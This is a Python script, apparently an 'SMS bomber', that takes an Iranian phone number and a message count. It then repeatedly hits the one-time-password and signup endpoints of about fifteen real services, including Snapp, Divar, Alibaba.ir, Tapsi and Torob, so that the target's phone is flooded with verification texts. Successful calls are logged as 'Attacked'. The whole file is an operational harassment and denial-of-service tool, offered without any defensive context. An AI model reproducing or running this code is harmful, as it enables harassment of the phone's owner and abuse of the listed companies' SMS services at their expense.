
from requests import post , get
from time import sleep
from os import system , name




# script coding by zero



def logo() :
 print(color.BLUE+"""
\n
    ==================================================================================================
    ▓      ██╗░█████╗░███████╗  ░█████╗░██╗░░░░░░█████╗░███╗░░██╗███████╗██████╗░                     ▓
    ▓      ██║██╔══██╗██╔════╝  ██╔══██╗██║░░░░░██╔══██╗████╗░██║██╔════╝██╔══██╗                     ▓ 
    ▓      ██║██║░░╚═╝█████╗░░  ██║░░╚═╝██║░░░░░██║░░██║██╔██╗██║█████╗░░██████╔╝                     ▓
    ▓      ██║██║░░██╗██╔══╝░░  ██║░░██╗██║░░░░░██║░░██║██║╚████║██╔══╝░░██╔══██╗                     ▓
    ▓      ██║╚█████╔╝███████╗  ╚█████╔╝███████╗╚█████╔╝██║░╚███║███████╗██║░░██║                     ▓
    ▓      ╚═╝░╚════╝░╚══════╝  ░╚════╝░╚══════╝░╚════╝░╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝boomber              ▓
    ==================================================================================================
"""+color.RED)



class color: 
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    PURPLE = '\033[95m'


def clear():
    #for win
    if name == 'nt':
        _ = system('cls')
    
    else:
        _ = system('clear')





sended = []

def log(looping_count, sms_number, phone_number):
    clear()
    logo()

    return_200 = str(sended.count(1))
    return_error = str(sended.count(0))
    return_internet_error = str(sended.count(-1))

    print("----------------------------------------------------")
    print("[-] Attack Started To : 98 {}".format(phone_number))
    print("\n\n[*] Attacked: {}/{}    Bad Post: {}    Connection Time Out: {}".format(return_200, sms_number, return_error, return_internet_error))
    print("\n[*] all lo0ping script : {}".format(looping_count))
    print("----------------------------------------------------")


# dos loop
 
def start():
    looping_count = 0

    clear()
    # input data
    logo()
    print("\n\n")
    phone_number = str(input("Phone Number?:\n>>+98 "))
    sms_number = int(input("How Much Message?:\n>>"))

    while looping_count <= sms_number:

        if sended.count(1) >= sms_number:
            clear()
            log(looping_count, sms_number, phone_number)
            print("\n[ ] Done, I sent more than {} sms to +98 {}\n".format(sms_number, phone_number ))
            break
        
        else:
            # print status log
            log(looping_count, sms_number, phone_number)

            looping_count = looping_count + 1
            
            # run site function'
            snap(phone_number)
            sleep(0)
            tamland(phone_number)
            sleep(0)
            alibaba(phone_number)
            sleep(0)
            tapsi(phone_number)
            sleep(0)
            divar(phone_number)
            sleep(0)
            sbm24(phone_number)
            sleep(0)
            anten(phone_number)
            sleep(0)
            snap_doctor(phone_number)
            sleep(0)
            togmond(phone_number)
            sleep(0)
            torob(phone_number)
            sleep(0)
            idifeng(phone_number)
            sleep(0)
            passhujiangcom(phone_number)
            sleep(0)
            zgtvspo38igeekgq(phone_number)
            sleep(0)
            apiwanwudezhicom(phone_number)
            sleep(0)
            

            # sleep time after 1 looping
            #sleep(1)





###############                  ###############               
###### site function     configs    start ######
###############                  ###############


# 001 snap
def snap(phone_number):
    try:
        phone_number = "+98" + phone_number
        data = {"cellphone":phone_number}
        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        p = post(url, json=data, timeout=2)
        sleep(0)
        
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print("[snap]  Attacked : {}".format(p))
            
        else:
            print("[-snap] Bad Post , error code:{}".format(p))
            sended.append(0)
    except:
        print("[-snap] Connection Time Out..")
        sended.append(-1)
        


# 002 tamland
def tamland(phone_number):
    try:
        phone_number = "0" + phone_number
        

        data = {"Mobile":phone_number,"SchoolId":-1}
        url = "https://api.famiran.com/api/user/signup"
        p = post(url, json=data, timeout=2)
        sleep(0)
        
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print("[tamland] Attacked : {}".format(p))
            
        else:
            print("[-tamland] Bad Post, error code: {}".format(p))
            sended.append(0)
    except:
        print("[-tamland] Connection Time Out..")
        sended.append(-1)
        


# 003 alibaba 
def alibaba(phone_number):
    try:
        phone_number = phone_number
        url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
        data = {"phoneNumber":phone_number}
        p = post(url, json=data, timeout=3)
        sleep(0)
        
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print("[alibaba] Attacked : {}".format(p))
            
        else: 
            print("[-alibaba] Bad Post, error code: {}".format(p))
            sended.append(0)
    except:
        print("[-alibaba] Connection Time Out..")
        sended.append(-1)

# 004 tapsi -limit
def tapsi(phone_number):
    try:
        phone_number = "0" + phone_number
        data = {"credential":{"phoneNumber":phone_number,"role":"PASSENGER"}}
        url = "https://tap33.me/api/v2/user"
        p = post(url, json=data, timeout=2 )
        sleep(0)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[tapsi] Attacked : {}".format(p))
        else:
            print("[-tapsi] Bad Post, error code: {}".format(p))
            sended.append(0)
    except:
        print("[-tapsi] Connection Time Out..")
        sended.append(-1)

# 005 divar
def divar(phone_number):
    try:
        phone_number = phone_number
        data = {"phone":phone_number}
        url = "https://api.divar.ir/v5/auth/authenticate"
        p = post(url, json=data, timeout=2)
        rp = p.status_code
        sleep(0)
        if rp == 200:
            sended.append(1)
            print("[divar] Attacked : {}".format(p))
        else:
            print("[-divar] Bad Post, error code: {}".format(p))
            sended.append(0)
    except:
        print("[-divar] Connection Time Out..")
        sended.append(-1)


# 006 sbm24 -limit
def sbm24(phone_number):
    try:
        data = {}
        url = "https://sandbox.sbm24.net/api/v2/authenticate/send-confirmation-code?mobile=0{}".format(phone_number)
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(0)
        if rp == 200:
            sended.append(1)
            print("[sbm24] Attacked : {}".format(p))
        else:
            print("[-sbm24] Bad Post, error code: {}".format(p))
            sended.append(0)
    except:
        print("[-sbm24] Connection Time Out..")
        sended.append(-1)



# 007 snap market
def snap_market(phone_number):
    try:

        data = {}
        url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{}&dummy=1603885783456".format(phone_number)
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(0)
        if rp == 200:
            sended.append(1)
            print("[snap_market] Attacked : {}".format(p))
        else:
            print("[-snap_market] Bad Post, error code: {}".format(p))
            sended.append(0)
    except:
        print("[-snap_market] Connection Time Out..")
        sended.append(-1)



# 008 anten *
def anten(phone_number):
    try:
        phone_number = '0'+phone_number
        data = {"phone":phone_number}
        url = "https://api2.anten.ir/users/"
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(0)
        if rp == 200:
            sended.append(1)
            print("[anten] Attacked : {}".format(p))
        else:
            print("[-anten] Bad Post, error code: {}".format(p))
            sended.append(0)
    except:
        print("[-anten] Connection Time Out..")
        sended.append(-1)


# 009 snap doctor *
def snap_doctor(phone_number):
    try:
        url = "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{}/sms?cCode=+98)".format(phone_number)
        p = get(url, timeout=3)
        rp = p.json()
        rp = rp["result"]
        sleep(0)
        if rp == "SUCCESS":
            sended.append(1)
            print("[snap doctor] send get and : {}".format(rp))
    except:
        print("[-snap doctor] Connection Time Out..")
        sended.append(-1)


# 010 togmond *
def togmond(phone_number):
    try:
        phone_number = phone_number
        data = "utf8=%E2%9C%93&phone_number=0{}".format(phone_number)
        url = "https://tagmond.com/phone_number"
        p = post(url, data=data, timeout=3)
        rp = p.status_code
        sleep(0)
        if rp == 200:
            sended.append(2) # for 10 try : dont send sms bot return 200!
            print("[togmond] Attacked : {}".format(p))
        else:
            print("[-togmond] Bad Post, error code: {}".format(p))
            sended.append(0)
    except:
        print("[-togmond] Connection Time Out..")
        sended.append(-1)


# 011 torob
def torob(phone_number):
    try:
        url = "https://api.torob.com/a/phone/send-pin/?phone_number=0{}".format(phone_number)
        p = get(url, timeout=3)
        rp = p.status_code
        sleep(0)
        if rp == 200:
            sended.append(1)
            print("[torob] Attacked : {}".format(p))
        else:
            print("[-torob] Bad Post, error code: {}".format(p))
            sended.append(0)
    except:
        print("[-torob] Connection Time Out..")
        sended.append(-1)

#012id.ifeng
def idifeng(phone_number):
    try:
        data = {"username":"+98"+phone_number}    
        url = "http://id.ifeng.com/api/simplesendmsg?mobile=%s"
        p = post(url, json=data, timeout=2)
        sleep(0)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[id.ifeng] Attacked : {}".format(p))
        else:
            print("[-id.ifeng] Bad Post, error code: {}".format(p))
            sended.append(0)
    except:
        print("[-id.ifeng] Connection Time Out..")
        sended.append(-1)

# 013 passhujiangcom
def passhujiangcom(phone_number):
    try:
        data = {"username":"+98"+phone_number}    
        url = "https://pass.hujiang.com/v2/api/v1/sms/send?action=SendMsg&mobile=%s"
        p = post(url, json=data, timeout=2)
        sleep(0)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[pass.hujiang] Attacked : {}".format(p))
        else:
            print("[-pass.hujiang] Bad Post, error code: {}".format(p))
            sended.append(0)
    except:
        print("[-pass.hujiang] Connection Time Out..")
        sended.append(-1)

# 014 zgtvspo38igeekgq
def zgtvspo38igeekgq(phone_number):
    try:
        url = "http://zgtv.spo38.igeek.gq/aip/index3.php?hm={}".format(phone_number)
        p = get(url, timeout=3)
        rp = p.status_code
        sleep(0)
        if rp == 200:
            sended.append(1)
            print("[zgtv.spo38.igeek] Attacked : {}".format(p))
        else:
            print("[-zgtv.spo38.igeek] Bad Post, error code: {}".format(p))
            sended.append(0)
    except:
        print("[-zgtv.spo38.igeek] Connection Time Out..")
        sended.append(-1)

# 015 apiwanwudezhicom
def apiwanwudezhicom(phone_number):
    try:
        data = {"username":"+98"+phone_number}    
        url = "https://api.wanwudezhi.com/module-user/api/v1/user/sendSmsCode?phone=%s"
        p = post(url, json=data, timeout=2)
        sleep(0)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[api.wanwudezhi] Attacked : {}".format(p))
        else:
            print("[-api.wanwudezhi] Bad Post, error code: {}".format(p))
            sended.append(0)
    except:
        print("[-api.wanwudezhi] Connection Time Out..")
        sended.append(-1)



site_function = 15
###############                  ###############               
###### site function     configs    end   ######
###############                  ###############


if __name__ == "__main__":
    start()







